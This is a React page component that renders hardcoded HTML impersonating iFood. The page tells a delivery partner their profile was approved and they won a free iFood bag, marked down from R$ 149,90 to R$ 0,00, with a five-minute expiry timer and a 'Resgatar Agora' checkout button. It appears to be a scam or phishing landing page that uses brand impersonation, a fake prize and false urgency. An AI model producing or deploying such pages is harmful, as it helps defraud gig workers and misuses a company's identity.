import React from 'react';

const html = "<header class=\"header\">\r\n        <div class=\"logo-container\">\r\n            <img src=\\"/assets/ifoodentregadores.webp\" alt=\"iFood Entregador\" class=\"ifood-logo ifood-logo--wide\">\r\n        </div>\r\n    </header>\r\n\r\n    <noscript class=\"no-js\">Para continuar, ative o JavaScript no navegador.</noscript>\r\n\r\n    <main class=\"container\">\r\n        <section class=\"step\" aria-hidden=\"false\">\r\n            <div class=\"badge-approved\">APROVADO</div>\r\n            <h1>Parab&#233;ns, <span id=\"lead-name\">parceiro</span>!</h1>\r\n            <p>Seu perfil foi selecionado. Voc&#234; ganhou a Bag do iFood.</p>\r\n\r\n            <div class=\"product-card\">\r\n                <img src=\\"/assets/bagfoto.webp\" alt=\"Mochila iFood\" class=\"success-img\" loading=\"lazy\" decoding=\"async\">\r\n                <div class=\"product-info\">\r\n                    <h3>Bag do iFood</h3>\r\n                    <div class=\"price-row\">\r\n                        <span class=\"old-price\">R$ 149,90</span>\r\n                        <span class=\"new-price\">R$ 0,00</span>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n\r\n            <div class=\"scarcity-box\">\r\n                <strong>Aten&#231;&#227;o:</strong> Resgate sua bag agora antes que o lote promocional encerre.\r\n                <div style=\"margin-top: 8px; font-weight: 700; color: #d32f2f;\">Expira em: <span id=\"timer\">05:00</span></div>\r\n            </div>\r\n\r\n            <div class=\"action-stack\">\r\n                <button id=\"btn-checkout\" class=\"btn-primary\" type=\"button\">Resgatar Agora</button>\r\n            </div>\r\n\r\n            <p class=\"shipping-note\">Envio imediato ap&#243;s confirma&#231;&#227;o.</p>\r\n        </section>\r\n    </main>\r\n\r\n    <div id=\"toast\" class=\"toast hidden\" role=\"status\" aria-live=\"polite\"></div>\r\n\r\n    <footer class=\"footer\">\r\n        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>\r\n    </footer>";

export default function SucessoPage() {
  return <div className="page-root" dangerouslySetInnerHTML={{ __html: html }} />;
}






